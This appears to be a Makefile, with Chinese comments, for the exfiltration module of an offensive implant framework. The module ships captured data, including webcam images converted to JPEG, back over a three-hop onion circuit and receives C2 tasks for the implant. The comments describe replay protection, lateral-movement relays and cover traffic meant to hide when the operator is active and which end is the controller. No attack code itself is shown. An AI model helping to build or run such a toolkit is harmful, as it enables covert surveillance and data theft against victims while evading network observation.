# 21_exfil/Makefile
#
# 采集产物回传层。
#
# 依赖（不自研第二套密码学，全部复用）：
#   14_p2p/build/libp2p.a  —— 定长信元层（底层 00_crypto 的 AES-128-GCM）
#   02_c2 / 00_crypto      —— GCM、SHA-256、HKDF、X25519
#   08_lateral             —— libp2p.a 内 relay 依赖的 poll 双工中继
#
# 依赖缺失时自动触发上游构建，不需要手工先 make 别的目录。

CC      ?= cc
CFLAGS  ?= -std=c11 -O2 -Wall -Wextra -Wpedantic -Wshadow -D_DEFAULT_SOURCE
CFLAGS  += -Iinclude -I../14_p2p/include -I../02_c2/include \
           -I../00_crypto/include -I../08_lateral/include \
           -I../agent_windows/include

BUILD   := build

P2PLIB  := ../14_p2p/build/libp2p.a
C2OBJS  := ../14_p2p/build/c2.o ../14_p2p/build/c2_frame.o \
           ../14_p2p/build/crypto_gcm.o ../14_p2p/build/crypto_hash.o \
           ../14_p2p/build/crypto_x25519.o
LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
# agent_windows 跨平台内核：采集 + JPEG 转码（端到端闭环的采集侧）
AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
           ../agent_windows/build/linux/cam_mock.o

all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop

$(BUILD):
	mkdir -p $(BUILD)

# 上游依赖缺失 -> 触发构建（幂等）
$(P2PLIB) $(C2OBJS):
	@$(MAKE) -C ../14_p2p --no-print-directory \
	  build/libp2p.a build/c2.o build/c2_frame.o \
	  build/crypto_gcm.o build/crypto_hash.o build/crypto_x25519.o

$(LATLIB):
	@$(MAKE) -C ../08_lateral --no-print-directory build/proxy.o build/lateral.o

$(AGOBJS):
	@$(MAKE) -C ../agent_windows --no-print-directory \
	  build/linux/cam_jpeg.o build/linux/cam_mock.o

$(BUILD)/exfil.o: src/exfil.c include/exfil.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 回传层与已建立电路的 IO 绑定（记录 <-> fd），含短写/读满/截断判定
$(BUILD)/exfil_link.o: src/exfil_link.c include/exfil_link.h include/exfil.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 采集调度层：触发模式 / 速率治理 / 去重。纯决策，不采集不发包，
# 故不链接任何密码学与上游库 —— 可独立编译。
$(BUILD)/sched.o: src/sched.c include/exfil_sched.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# C2 下行任务通道：编码唯一性校验 + 配置校验 + 落到调度器。
# 依赖 sched.o（作用对象）与 02_c2 帧层（AEAD 封装）。
$(BUILD)/task.o: src/task.c include/exfil_task.h include/exfil_sched.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/test_task: tests/test_task.c $(BUILD)/task.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
	  $(P2PLIB) $(C2OBJS) $(LATLIB)

# 任务通道与已建立电路的 IO 绑定：长度前缀帧 + 双向 IV 计数 + seq 单调性
# （c2_frame 把 IV 放线上、不跟踪计数器，重放防护只能由本层补）
$(BUILD)/task_link.o: src/task_link.c include/exfil_task_link.h include/exfil_task.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 端到端：C2 命令经**真实洋葱电路**（3 跳真进程）下行 -> 落到植入体调度器
# -> 回执原路返回。含篡改/错密钥/重放/超长声明取证。
# 重连恢复接进真实洋葱电路：断开 -> 重建电路 -> 用恢复点续用会话。
# 含"计数归零 => IV 重用 => 必须 AUTH"的反证用例。
$(BUILD)/test_task_resume: tests/test_task_resume.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/task_link.o \
	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
	  $(P2PLIB) $(C2OBJS) $(LATLIB)

$(BUILD)/test_task_circuit: tests/test_task_circuit.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/task_link.o \
	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
	  $(P2PLIB) $(C2OBJS) $(LATLIB)

$(BUILD)/test_sched: tests/test_sched.c $(BUILD)/sched.o
	$(CC) $(CFLAGS) $< $(BUILD)/sched.o -o $@

# 调度层与真实回传链路的集成对照：无限速 vs 调度门控，实测线上信元/字节
$(BUILD)/test_sched_gate: tests/test_sched_gate.c $(BUILD)/sched.o $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
	$(CC) $(CFLAGS) $< $(BUILD)/sched.o $(BUILD)/exfil.o -o $@ \
	  $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)

# 端到端：采集产物经**真实洋葱电路**（3 跳真进程）回传并对端重组
$(BUILD)/test_exfil_circuit: tests/test_exfil_circuit.c $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
	  $(P2PLIB) $(C2OBJS) $(LATLIB)

$(BUILD)/test_exfil: tests/test_exfil.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)

# 跨语言对齐工具：C 侧走真实会话派生编码出信元流 -> 文件，
# 供 13_c2_server（Python ExfilSink）解码比对。必须由 C 侧真编码才测得准。
$(BUILD)/dump_cells: tests/dump_cells.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)

# 端到端：agent_windows 采集 -> JPEG -> exfil 信元 -> 重组校验
$(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)

# 自适应覆盖流量接入真实发送循环：提交 + 泵送（入队-出片交替）。
# 依赖 14_p2p 的 mix/cover（libp2p.a）与 exfil 的 chan/link。
$(BUILD)/link_cover.o: src/link_cover.c include/exfil_link_cover.h include/exfil.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 真实进程端到端：fork + socketpair，父发子收。验证空闲期覆盖流量在线上
# 流动、覆盖不吃掉数据、大载荷分批入队发完、换信道覆盖自动缩放。
$(BUILD)/test_link_cover: tests/test_link_cover.c $(BUILD)/link_cover.o $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
	  $(P2PLIB) $(C2OBJS) $(LATLIB)

# 跨语言对齐工具：C 侧真编码任务/回执 -> 文件，供 Python 侧解码比对；
# 反向模式 chk 则读取 Python 生成的 wire 并解码，实现双向验证。
$(BUILD)/dump_task: tests/dump_task.c $(BUILD)/task.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
	  $(P2PLIB) $(C2OBJS) $(LATLIB)

# 任务通道的覆盖流量维持：空闲期按预算持续吐出恒长 PAD 信元，消除
# 「链路静默=操作员空闲」「突发一个包=刚下了命令」的观测对应。
# PAD 走信元层、不动应用层 seq；与数据共用 cell 上下文以保证 counter 单调。
$(BUILD)/task_cover.o: src/task_cover.c include/exfil_task_cover.h \
                       include/exfil_task_link.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/test_task_cover: tests/test_task_cover.c $(BUILD)/task_cover.o \
    $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
    $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/task_cover.o $(BUILD)/task.o \
	  $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
	  $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)

# 任务通道的**真实事件循环**：把覆盖从"可调用的函数"变成"长期运行的行为"。
# 两端各跑一个实例（下行由服务端补、上行由植入体补），只在一端跑覆盖会让
# 另一方向仍然可读——观察者能看出谁是控制端。
# 同时补回自适应：take_due 不推进 EWMA 窗口，故本层显式调用 p2p_cover_tick，
# 并暴露 note_data 让循环外发送的数据被计入。
$(BUILD)/cover_loop.o: src/cover_loop.c include/cover_loop.h \
                       include/exfil_task_cover.h include/exfil_task_link.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/test_cover_loop: tests/test_cover_loop.c $(BUILD)/cover_loop.o \
    $(BUILD)/task_cover.o $(BUILD)/task.o $(BUILD)/task_link.o \
    $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o \
    $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/cover_loop.o $(BUILD)/task_cover.o \
	  $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)

test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop
	./$(BUILD)/test_exfil
	./$(BUILD)/test_cam_e2e
	./$(BUILD)/test_exfil_circuit
	./$(BUILD)/test_sched
	./$(BUILD)/test_sched_gate
	./$(BUILD)/test_task
	./$(BUILD)/test_task_circuit
	./$(BUILD)/test_link_cover
	./$(BUILD)/test_task_cover
	./$(BUILD)/test_cover_loop

inspect: all
	@echo "== 21_exfil 公开符号 =="
	@nm -g --defined-only $(BUILD)/exfil.o | awk '$$2=="T"{print "  "$$3}'
	@echo "== 动态依赖 =="
	@ldd $(BUILD)/test_exfil | head -5

clean:
	rm -rf $(BUILD)

.PHONY: all test clean inspect
